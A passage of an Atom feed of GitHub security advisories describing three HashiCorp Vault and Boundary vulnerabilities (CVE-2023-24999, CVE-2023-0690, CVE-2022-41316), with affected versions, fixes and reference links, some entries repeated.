        <title type="html"><![CDATA[[github.com/hashicorp/vault] Hashicorp Vault Fails to Verify if Approle SecretID Belongs to Role During a Destroy Operation]]></title>
        <id>https://github.com/advisories/GHSA-wmg5-g953-qqfw</id>
        <link href="https://github.com/advisories/GHSA-wmg5-g953-qqfw"/>
        <updated>2023-07-06T21:51:18.000Z</updated>
        <content type="html"><![CDATA[<p>When using the Vault and Vault Enterprise (Vault) approle auth method, any authenticated user with access to the <code>/auth/approle/role/:role_name/secret-id-accessor/destroy</code> endpoint can destroy the secret ID of any other role by providing the secret ID accessor. This vulnerability, CVE-2023-24999, has been fixed in Vault 1.13.0, 1.12.4, 1.11.8, 1.10.11 and above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-24999">https://nvd.nist.gov/vuln/detail/CVE-2023-24999</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305">https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305</a></li>
<li><a href="https://github.com/advisories/GHSA-wmg5-g953-qqfw">https://github.com/advisories/GHSA-wmg5-g953-qqfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmg5-g953-qqfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T19:24:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] Hashicorp Vault Fails to Verify if Approle SecretID Belongs to Role During a Destroy Operation]]></title>
        <id>https://github.com/advisories/GHSA-wmg5-g953-qqfw</id>
        <link href="https://github.com/advisories/GHSA-wmg5-g953-qqfw"/>
        <updated>2023-07-06T21:51:18.000Z</updated>
        <content type="html"><![CDATA[<p>When using the Vault and Vault Enterprise (Vault) approle auth method, any authenticated user with access to the <code>/auth/approle/role/:role_name/secret-id-accessor/destroy</code> endpoint can destroy the secret ID of any other role by providing the secret ID accessor. This vulnerability, CVE-2023-24999, has been fixed in Vault 1.13.0, 1.12.4, 1.11.8, 1.10.11 and above.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-24999">https://nvd.nist.gov/vuln/detail/CVE-2023-24999</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305">https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305</a></li>
<li><a href="https://github.com/advisories/GHSA-wmg5-g953-qqfw">https://github.com/advisories/GHSA-wmg5-g953-qqfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmg5-g953-qqfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T19:24:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/boundary] HashiCorp Boundary Workers Store Rotated Credentials in Plaintext Even When Key Management Service Configured]]></title>
        <id>https://github.com/advisories/GHSA-9vrm-v9xv-x3xr</id>
        <link href="https://github.com/advisories/GHSA-9vrm-v9xv-x3xr"/>
        <updated>2023-07-06T21:47:41.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Boundary from 0.10.0 through 0.11.2 contain an issue where when using a PKI-based worker with a Key Management Service (KMS) defined in the configuration file, new credentials created after an automatic rotation may not have been encrypted via the intended KMS. This would result in the credentials being stored in plaintext on the Boundary PKI worker’s disk. This issue is fixed in version 0.12.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0690">https://nvd.nist.gov/vuln/detail/CVE-2023-0690</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2023-03-boundary-workers-store-rotated-credentials-in-plaintext-even-when-key-management-service-configured/49907">https://discuss.hashicorp.com/t/hcsec-2023-03-boundary-workers-store-rotated-credentials-in-plaintext-even-when-key-management-service-configured/49907</a></li>
<li><a href="https://github.com/advisories/GHSA-9vrm-v9xv-x3xr">https://github.com/advisories/GHSA-9vrm-v9xv-x3xr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9vrm-v9xv-x3xr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-06T19:24:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault's revocation list not respected]]></title>
        <id>https://github.com/advisories/GHSA-9mh8-9j64-443f</id>
        <link href="https://github.com/advisories/GHSA-9mh8-9j64-443f"/>
        <updated>2023-07-06T21:18:08.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise’s TLS certificate auth method did not initially load the optionally configured CRL issued by the role's CA into memory on startup, resulting in the revocation list not being checked if the CRL has not yet been retrieved. Fixed in 1.12.0, 1.11.4, 1.10.7, and 1.9.10.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41316">https://nvd.nist.gov/vuln/detail/CVE-2022-41316</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483">https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483</a></li>
<li><a href="https://github.com/advisories/GHSA-9mh8-9j64-443f">https://github.com/advisories/GHSA-9mh8-9j64-443f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mh8-9j64-443f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:24:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault's revocation list not respected]]></title>
        <id>https://github.com/advisories/GHSA-9mh8-9j64-443f</id>
        <link href="https://github.com/advisories/GHSA-9mh8-9j64-443f"/>
        <updated>2023-07-06T21:18:08.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise’s TLS certificate auth method did not initially load the optionally configured CRL issued by the role's CA into memory on startup, resulting in the revocation list not being checked if the CRL has not yet been retrieved. Fixed in 1.12.0, 1.11.4, 1.10.7, and 1.9.10.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41316">https://nvd.nist.gov/vuln/detail/CVE-2022-41316</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483">https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483</a></li>
<li><a href="https://github.com/advisories/GHSA-9mh8-9j64-443f">https://github.com/advisories/GHSA-9mh8-9j64-443f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mh8-9j64-443f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:24:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp/vault] HashiCorp Vault's revocation list not respected]]></title>
        <id>https://github.com/advisories/GHSA-9mh8-9j64-443f</id>
        <link href="https://github.com/advisories/GHSA-9mh8-9j64-443f"/>
        <updated>2023-07-06T21:18:08.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp Vault and Vault Enterprise’s TLS certificate auth method did not initially load the optionally configured CRL issued by the role's CA into memory on startup, resulting in the revocation list not being checked if the CRL has not yet been retrieved. Fixed in 1.12.0, 1.11.4, 1.10.7, and 1.9.10.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-41316">https://nvd.nist.gov/vuln/detail/CVE-2022-41316</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483">https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483</a></li>
<li><a href="https://github.com/advisories/GHSA-9mh8-9j64-443f">https://github.com/advisories/GHSA-9mh8-9j64-443f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mh8-9j64-443f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-06T19:24:01.000Z</published>
    </entry>
</feed>